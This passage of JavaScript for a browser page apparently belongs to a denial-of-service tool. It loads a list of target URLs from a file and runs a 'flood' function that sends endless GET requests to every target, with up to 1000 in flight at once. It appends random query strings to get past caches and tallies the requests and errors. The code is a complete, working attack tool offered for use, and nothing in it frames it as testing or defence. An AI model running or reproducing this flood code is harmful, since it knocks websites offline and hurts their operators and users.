}

var CONCURRENCY_LIMIT = 1000;
var queue = [];
var isRunning = false;
var fileInput = document.getElementById('js-inputfile');
var startBtn = document.getElementById('js-start');
var stopBtn = document.getElementById('js-stop');

fileInput.addEventListener('change', function() {
  var file = new FileReader();

  file.onload=function() {
    var urls = file.result.split('\n').filter(function (url) {
      return url.length;
    });

    targets = {};

    urls.forEach(function (url) {
      targets[url] = {number_of_requests: 0, number_of_errored_responses: 0};
    });
  }

  file.readAsText(this.files[0]);
});

startBtn.addEventListener('click', function (event) {
  event.preventDefault();
  start();
});

stopBtn.addEventListener('click', function (event) {
  event.preventDefault();
  stop();
});

async function fetchWithTimeout(resource, options) {
  const controller = new AbortController();
  const id = setTimeout(() => controller.abort(), options.timeout);
  return fetch(resource, {
    method: 'GET',
    mode: 'no-cors',
    signal: controller.signal
  }).then((response) => {
    clearTimeout(id);
    return response;
  }).catch((error) => {
    clearTimeout(id);
    throw error;
  });
}

async function flood(target) {
  for (var i = 0;; ++i) {
    if (queue.length > CONCURRENCY_LIMIT) {
      await queue.shift()
    }
    rand = i % 3 === 0 ? '' : ('?' + Math.random() * 1000)
    if (!isRunning) {
      return;
    }
    queue.push(
      fetchWithTimeout(target+rand, { timeout: 1000 })
        .catch((error) => {
          if (error.code === 20 /* ABORT */) {
            return;
          }
          targets[target].number_of_errored_responses++;
        })
        .then((response) => {
          if (response && !response.ok) {
            targets[target].number_of_errored_responses++;
          }
          targets[target].number_of_requests++;
        })

    )
  }
}

function start () {
  isRunning = true;
  Object.keys(targets).map(flood);
  startBtn.classList.add('hidden');
  stopBtn.classList.remove('hidden');
  console.log('Started');
}

function stop () {
  isRunning = false;
  stopBtn.classList.add('hidden');
  startBtn.classList.remove('hidden');
  console.log('Stopped');
}
